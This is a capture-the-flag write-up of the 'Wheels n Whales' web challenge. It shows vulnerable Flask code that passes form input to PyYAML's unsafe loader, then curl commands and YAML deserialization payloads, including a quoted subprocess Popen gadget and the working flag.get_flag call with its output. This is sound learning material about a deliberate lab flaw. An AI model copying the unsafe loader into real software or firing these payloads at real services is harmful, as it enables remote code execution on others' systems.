# Wheels n Whales - Cyber Security Rumble CTF 2020


# Wheels n Whales

- Category: Web

*"I've heard that Whales and Wheels are the new hot thing. So a buddy of mine build a website where you can get your own. I think he hid an easter egg somewhere, but I can't get to it, can you help me?"*

- There is a website that goes to http://chal.cybersecurityrumble.de:7780/
- A file is provided: `web.py`

```python
import yaml
from flask import redirect, Flask, render_template, request, abort
from flask import url_for, send_from_directory, make_response, Response
import flag

app = Flask(__name__)

EASTER_WHALE = {"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}

@app.route("/")
def index():
    return render_template("index.html.jinja", active="home")


class Whale:
    def __init__(self, name, image_num, weight):
        self.name = name
        self.image_num = image_num
        self.weight = weight
    
    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/whale", methods=["GET", "POST"])
def whale():
    if request.method == "POST":
        name = request.form["name"]
        if len(name) > 10: 
            return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
        image_num = request.form["image_num"]
        weight = request.form["weight"]
        whale = Whale(name, image_num, weight)
        if whale.__dict__ == EASTER_WHALE:
            return make_response(flag.get_flag(), 200)
        return make_response(render_template("whale.html.jinja", w=whale, active="whale"), 200)
    return make_response(render_template("whale_builder.html.jinja", active="whale"), 200)


class Wheel:
    def __init__(self, name, image_num, diameter):
        self.name = name
        self.image_num = image_num
        self.diameter = diameter

    @staticmethod
    def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader))
    
    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/wheel", methods=["GET", "POST"])
def wheel():
    if request.method == "POST":
        if "config" in request.form:
            wheel = Wheel.from_configuration(request.form["config"])
            return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
        name = request.form["name"]
        image_num = request.form["image_num"]
        diameter = request.form["diameter"]
        wheel = Wheel(name, image_num, diameter)
        print(wheel.dump())
        return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
    return make_response(render_template("wheel_builder.html.jinja", active="wheel"), 200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
```

## Understanding the program

`web.py` is a Flask application, where [Flask](https://flask.palletsprojects.com/en/1.1.x/) is - in short - a Python framework to create websites.


The flag is displayed if we manage to create an "Easter Whale":

```python
import flag
...
EASTER_WHALE = {"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}
...

	if whale.__dict__ == EASTER_WHALE:
            return make_response(flag.get_flag(), 200)
```

The problem is that we can't (normally) create such a whale, because whale names are limited to 10 characters:

```python
@app.route("/whale", methods=["GET", "POST"])
def whale():
    if request.method == "POST":
        name = request.form["name"]
        if len(name) > 10: 
            return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
```	    


## We don't have wheels without a reason

The program also allows to create *wheels*. Wheels can be instantiated using the standard constructor, or read from a YAML configuration file:

```python
def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader))
```

Have a look on Internet, and you'll see everywhere that [using the standard YAML loader is *not safe*](https://pyyaml.org/wiki/PyYAMLDocumentation).

**"Warning: It is not safe to call yaml.load with any data received from an untrusted source! "**

In a CTF, this is certainly not genuine, the flaw is there on purpose and we must exploit it.

## Posting a configuration

So, we'll be abusing the `yaml.load` function, which requires that we perform an HTTP POST on `wheel`, and provide a `config` in the form:

```python

@staticmethod
def from_configuration(config):
    return Wheel(**yaml.load(config, Loader=yaml.Loader))
    
[..]

@app.route("/wheel", methods=["GET", "POST"])
def wheel():
    if request.method == "POST":
        if "config" in request.form:
            wheel = Wheel.from_configuration(request.form["config"])
```	    
	    
We can do the POST with curl:

`curl -X POST -d 'config=...'`

## How I wasted hours stupidly

My goal was to create that Easter Whale, and I spent hours understanding which exact syntax to use.
I saw [here](https://pyyaml.org/wiki/PyYAMLDocumentation) that we could create objects using the syntax `!!python/object:CLASS ...`.

As Whales are defined in `web.py`, we need to specify `web.Whale`.
I tried locally on my host, and the Flask application would complain all the time: *"TypeError: type object argument after ** must be a mapping, not Whale"*

I tried several things:

- Create multiple YAML documents. Error: *"expected a single document in the stream"*
- Different syntax to provide the document using the serialized or the unserialized form
- Adding URL encoding in characters
- Using different options of curl (--data-binary, -F...)


```
curl -X POST -d 'config="""\n!!python/object:web.Whale\nname:TheBestWhaleIsAWhaleEveryOneLikes\nimage_num:2\nweight:34"""' http://127.0.0.1:5000/wheel
curl -X POST -d 'config="""\n!!python/object:web.Whale\nname:TheBestWhaleIsAWhaleEveryOneLikes\nimage_num:2\nweight:34"""' http://127.0.0.1:5000/wheel
curl -X POST -d 'config="""\n!!python/object:web.Whale\nname: TheBestWhaleIsAWhaleEveryOneLikes\nimage_num: 2\nweight: 34"""' http://127.0.0.1:5000/wheel
curl -X POST -d 'config=\"\"\"%0A%21%21python/object:web.Whale%0Aname: TheBestWhaleIsAWhaleEveryOneLikes%0Aimage_num: 2%0Aweight: 34%0A\"\"\"' http://127.0.0.1:5000/wheel
curl -X POST -d 'config=\"\"\"%0A%21%21python/object:web.Whale%0A%20name%3A%20TheBestWhaleIsAWhaleEveryOneLikes%0A%20image_num:%202%0A%20weight:%2034%0A\"\"\"' http://127.0.0.1:5000/wheel
```

## Closer to the solution

I stumbled on [YAML Deserialization Attack in Python](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter). I learned that it was possible to launch process that way:

`"""!!python/object/apply:subprocess:Popen
- ls"""`

I struggled with the formatting and it didn't work.


I tried again with a non-serialized syntax: `!!python/object/apply:builtins.range [1, 10, 1]` and it worked better, except it refused to create a range, because it was expecting a mapping.


## Solution

Then, after a while (and lots of despair), I realized that even if I managed to create my Easter Whale, it wouldn't help me very much, because how would I then get the flag? The flag would only be displayed if I *posted* such a whale on the `/whale` page. So, I thought: how about simply calling `get_flag()`.

I concentrated on this goal:

- We need the `!!python/object/apply` syntax
- Function `get_flag()` is in the `flag` module, so I'll need to call `flag.get_flag`

After a few attempts, it was still complaining that it was expecting a mapping for the Wheel object.
So, I got the idea to put that `!!python/object` stuff inside a field of the Wheel object.

`{name: !!python/object/apply:flag.get_flag [], image_num: 2, diameter: 5}`

We don't care at all about `image_num` and `diameter` (but must provide them to create the Wheel).

Finally, I worked out the final solution with some URL encoding:

```
curl -X POST -d 'config={name:%20!!python/object/apply:flag.get_flag [], image_num: 2, diameter: 5}' http://chal.cybersecurityrumble.de:7780/wheel

[..]

<h1>Here you go</h1>
<h1>CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}</h1>
Diameter: 5
<code>
diameter: 5
image_num: 2
name: CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}
[..]
```

Despite "easy", I learned a lot with this challenge and enjoyed it. I had no idea about this YAML exploit, and will be certain to be cautious if I ever need to use it in the future.

